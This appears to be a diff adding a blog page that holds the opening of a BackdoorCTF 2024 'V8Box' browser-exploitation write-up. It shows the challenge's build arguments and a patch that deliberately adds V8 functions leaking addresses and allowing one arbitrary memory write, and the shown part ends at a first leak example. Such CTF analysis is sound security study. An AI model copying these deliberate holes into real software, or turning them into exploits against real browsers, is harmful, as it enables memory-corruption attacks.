@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Linz">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://linz04.github.io/2025/08/05/backdoorctf-2024-v8box/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BackdoorCTF 2024 - V8Box">
+<meta property="og:url" content="https://linz04.github.io/2025/08/05/BackdoorCTF-2024-V8Box/index.html">
+<meta property="og:site_name" content="Linz&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://linz04.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-08-05T03:50:08.852Z">
+<meta property="article:modified_time" content="2025-08-05T03:50:08.852Z">
+<meta property="article:author" content="Linz">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Browser Exploitation">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://linz04.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/linux_logo2.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/linux_logo2.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/linux_logo2.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            BackdoorCTF 2024 - V8Box | Linz&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"linz04.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Linz's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/linz04","instagram":null,"zhihu":null,"twitter":null,"linkedin":"https://www.linkedin.com/in/linuztri/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Linz&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">BackdoorCTF 2024 - V8Box</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/linux_logo2.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Linz</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-05 11:50:08</span>
+        <span class="mobile">2025-08-05 11:50:08</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-05 11:50:08</span>
+            <span class="mobile">2025-08-05 11:50:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF-Writeups/">CTF Writeups</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Browser-Exploitation/">Browser Exploitation</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="V8Box"><a href="#V8Box" class="headerlink" title="V8Box"></a>V8Box</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/v8box/v8box.png"
+                      alt="v8box"
+                ></p>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>You can download the challenge <a class="link"   target="_blank" rel="noopener" href="https://github.com/linz04/PWN-Writeup/raw/refs/heads/international/BackdoorCTF2024/V8box" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<blockquote>
+<p>Author: p0ch1ta<br>Wasm and JIT are so 2019. Let’s isolate them and go back to our roots.</p>
+</blockquote>
+<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>In this challenges we are given compiled the v8 (d8) as well as the vuln.patch &amp; args.gn<br>The content of args.gn file is like this</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">is_component_build = false</span><br><span class="line">is_debug = false</span><br><span class="line">target_cpu = &quot;x64&quot;</span><br><span class="line">v8_enable_sandbox = true</span><br><span class="line"></span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br><span class="line"></span><br><span class="line">v8_enable_memory_corruption_api = true</span><br><span class="line"></span><br><span class="line">v8_jitless = true</span><br><span class="line">v8_enable_webassembly = false</span><br><span class="line">v8_enable_sparkplug = false</span><br><span class="line">v8_enable_maglev = false</span><br><span class="line">v8_enable_turbofan = false</span><br></pre></td></tr></table></figure></div>
+
+<p>The v8 compiled with <strong>Sandbox API Enabled</strong> and without <strong>JIT, WASM, Maglev, etc</strong> which make the challenges quite hard to get shell, because usually we using web assembly for getting shell in most v8 challenges.</p>
+<h2 id="Patch-Analysis"><a href="#Patch-Analysis" class="headerlink" title="Patch Analysis"></a>Patch Analysis</h2><p>Now let’s take a look on the <code>vuln.patch</code></p>
+<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">From dd6cd956e058d04c0d72c7915ec38e7e38f834b5 Mon Sep 17 00:00:00 2001</span><br><span class="line">From: Manas &lt;ghandatmanas@gmail.com&gt;</span><br><span class="line">Date: Thu, 12 Dec 2024 20:46:19 +0530</span><br><span class="line">Subject: [PATCH] kek</span><br><span class="line"></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"> src/d8/d8.cc                 | 10 +++--</span><br><span class="line"> src/flags/flag-definitions.h |  2 +-</span><br><span class="line"> src/sandbox/testing.cc       | 77 ++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 3 files changed, 84 insertions(+), 5 deletions(-)</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index ef81fbe0b80..70d248e5faa 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -2297,9 +2297,10 @@</span> MaybeLocal&lt;Context&gt; Shell::CreateRealm(</span><br><span class="line">     &#125;</span><br><span class="line">     delete[] old_realms;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="deletion">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span><br><span class="line"><span class="addition">+  // Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span><br><span class="line">   Local&lt;Context&gt; context =</span><br><span class="line"><span class="deletion">-      Context::New(isolate, nullptr, global_template, global_object);</span></span><br><span class="line"><span class="addition">+      // Context::New(isolate, nullptr, global_template, global_object);</span></span><br><span class="line"><span class="addition">+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), global_object);</span></span><br><span class="line">   if (context.IsEmpty()) return MaybeLocal&lt;Context&gt;();</span><br><span class="line">   DCHECK(!try_catch.HasCaught());</span><br><span class="line">   InitializeModuleEmbedderData(context);</span><br><span class="line"><span class="meta">@@ -4147,9 +4148,10 @@</span> MaybeLocal&lt;Context&gt; Shell::CreateEvaluationContext(Isolate* isolate) &#123;</span><br><span class="line">       reinterpret_cast&lt;i::Isolate*&gt;(isolate)-&gt;main_thread_local_isolate(),</span><br><span class="line">       context_mutex_.Pointer());</span><br><span class="line">   // Initialize the global objects</span><br><span class="line"><span class="deletion">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span><br><span class="line"><span class="addition">+  // Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span><br><span class="line">   EscapableHandleScope handle_scope(isolate);</span><br><span class="line"><span class="deletion">-  Local&lt;Context&gt; context = Context::New(isolate, nullptr, global_template);</span></span><br><span class="line"><span class="addition">+  // Local&lt;Context&gt; context = Context::New(isolate, nullptr, global_template);</span></span><br><span class="line"><span class="addition">+  Local&lt;Context&gt; context = Context::New(isolate, nullptr, ObjectTemplate::New(isolate));</span></span><br><span class="line">   if (context.IsEmpty()) &#123;</span><br><span class="line">     DCHECK(isolate-&gt;IsExecutionTerminating());</span><br><span class="line">     return &#123;&#125;;</span><br><span class="line"><span class="comment">diff --git a/src/flags/flag-definitions.h b/src/flags/flag-definitions.h</span></span><br><span class="line"><span class="comment">index 644c0983958..9d93ed5779b 100644</span></span><br><span class="line"><span class="comment">--- a/src/flags/flag-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/flags/flag-definitions.h</span></span><br><span class="line"><span class="meta">@@ -2870,7 +2870,7 @@</span> DEFINE_NEG_IMPLICATION(sandbox_fuzzing, sandbox_testing)</span><br><span class="line"> DEFINE_NEG_IMPLICATION(sandbox_testing, sandbox_fuzzing)</span><br><span class="line"> </span><br><span class="line"> #ifdef V8_ENABLE_MEMORY_CORRUPTION_API</span><br><span class="line"><span class="deletion">-DEFINE_BOOL(expose_memory_corruption_api, false,</span></span><br><span class="line"><span class="addition">+DEFINE_BOOL(expose_memory_corruption_api, true,</span></span><br><span class="line">             &quot;Exposes the memory corruption API. Set automatically by &quot;</span><br><span class="line">             &quot;--sandbox-testing and --sandbox-fuzzing.&quot;)</span><br><span class="line"> DEFINE_IMPLICATION(sandbox_fuzzing, expose_memory_corruption_api)</span><br><span class="line"><span class="comment">diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc</span></span><br><span class="line"><span class="comment">index 8bc740937af..fbd2a7c0282 100644</span></span><br><span class="line"><span class="comment">--- a/src/sandbox/testing.cc</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/testing.cc</span></span><br><span class="line"><span class="meta">@@ -411,6 +411,79 @@</span> void SandboxGetFieldOffset(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span><br><span class="line">   info.GetReturnValue().Set(offset);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+// Sandbox.getPIELeak</span></span><br><span class="line"><span class="addition">+void SandboxGetPIELeak(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)&#123;</span></span><br><span class="line"><span class="addition">+  DCHECK(ValidateCallbackInfo(info));</span></span><br><span class="line"><span class="addition">+  double leak = (double)((unsigned long int)(&amp;SandboxGetPIELeak) &gt;&gt; 32 &lt;&lt; 32);</span></span><br><span class="line"><span class="addition">+  info.GetReturnValue().Set(v8::Number::New(info.GetIsolate(), leak));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.leakIsolate(offset) -&gt; double</span></span><br><span class="line"><span class="addition">+void SandboxLeakIsolate(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)&#123;</span></span><br><span class="line"><span class="addition">+  static int leaked = 0;</span></span><br><span class="line"><span class="addition">+  </span></span><br><span class="line"><span class="addition">+  if(leaked != 0)&#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(v8::Boolean::New(info.GetIsolate(), false));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DCHECK(ValidateCallbackInfo(info));</span></span><br><span class="line"><span class="addition">+  if(info.Length() != 1)&#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(v8::Boolean::New(info.GetIsolate(), false));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+  v8::Local&lt;v8::Context&gt; context = isolate-&gt;GetCurrentContext();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::Integer&gt; offset;</span></span><br><span class="line"><span class="addition">+  if(!info[0]-&gt;ToInteger(context).ToLocal(&amp;offset))&#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(v8::Boolean::New(info.GetIsolate(), false));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  void *addr = (void *)(offset-&gt;Value() + isolate);</span></span><br><span class="line"><span class="addition">+  double leak = *(double *)addr;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  leaked = 1;</span></span><br><span class="line"><span class="addition">+  info.GetReturnValue().Set(v8::Number::New(info.GetIsolate(), leak));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.ArbMemoryWrite(addr, value) -&gt; Bool</span></span><br><span class="line"><span class="addition">+void ArbMemoryWrite(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+  static int written_data = 0;</span></span><br><span class="line"><span class="addition">+  if(written_data != 0)&#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(v8::Boolean::New(info.GetIsolate(), false));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DCHECK(ValidateCallbackInfo(info));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::Context&gt; context = isolate-&gt;GetCurrentContext();</span></span><br><span class="line"><span class="addition">+  </span></span><br><span class="line"><span class="addition">+  if(info.Length() != 2)&#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Expects two BigInt argument (address and value)&quot;);</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(v8::Boolean::New(info.GetIsolate(), false));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::BigInt&gt; arg1, arg2;</span></span><br><span class="line"><span class="addition">+  if (!info[0]-&gt;ToBigInt(context).ToLocal(&amp;arg1) ||</span></span><br><span class="line"><span class="addition">+      !info[1]-&gt;ToBigInt(context).ToLocal(&amp;arg2)) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Expects two BigInt argument (address and value)&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint64_t *address = (uint64_t *)arg1-&gt;Uint64Value();</span></span><br><span class="line"><span class="addition">+  uint64_t value = arg2-&gt;Uint64Value();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  *address = value;</span></span><br><span class="line"><span class="addition">+  written_data = 1;</span></span><br><span class="line"><span class="addition">+  info.GetReturnValue().Set(v8::Boolean::New(info.GetIsolate(), true));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> Handle&lt;FunctionTemplateInfo&gt; NewFunctionTemplate(</span><br><span class="line">     Isolate* isolate, FunctionCallback func,</span><br><span class="line">     ConstructorBehavior constructor_behavior) &#123;</span><br><span class="line"><span class="meta">@@ -505,6 +578,10 @@</span> void SandboxTesting::InstallMemoryCorruptionApi(Isolate* isolate) &#123;</span><br><span class="line">                   &quot;getInstanceTypeIdFor&quot;, 1);</span><br><span class="line">   InstallFunction(isolate, sandbox, SandboxGetFieldOffset, &quot;getFieldOffset&quot;, 2);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  InstallGetter(isolate, sandbox, SandboxGetPIELeak, &quot;getPIELeak&quot;);</span></span><br><span class="line"><span class="addition">+  InstallFunction(isolate, sandbox, SandboxLeakIsolate, &quot;leakIsolate&quot;, 1);</span></span><br><span class="line"><span class="addition">+  InstallFunction(isolate, sandbox, ArbMemoryWrite, &quot;arbMemoryWrite&quot;, 2);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   // Install the Sandbox object as property on the global object.</span><br><span class="line">   Handle&lt;JSGlobalObject&gt; global = isolate-&gt;global_object();</span><br><span class="line">   Handle&lt;String&gt; name =</span><br><span class="line"><span class="deletion">-- </span></span><br><span class="line">2.43.0</span><br></pre></td></tr></table></figure></div>
+
+<p>In summary the patch created 3 function:</p>
+<ul>
+<li>The first one is <code>Sandbox.getPIELeak</code> which will be return address of PIE, but only upper bits  <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Leak: &quot;</span>, <span class="title class_">Sandbox</span>.<span class="property">getPIELeak</span>.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//output : Leak:  572900000000</span></span><br></pre></td></tr></table></figure></div></li>
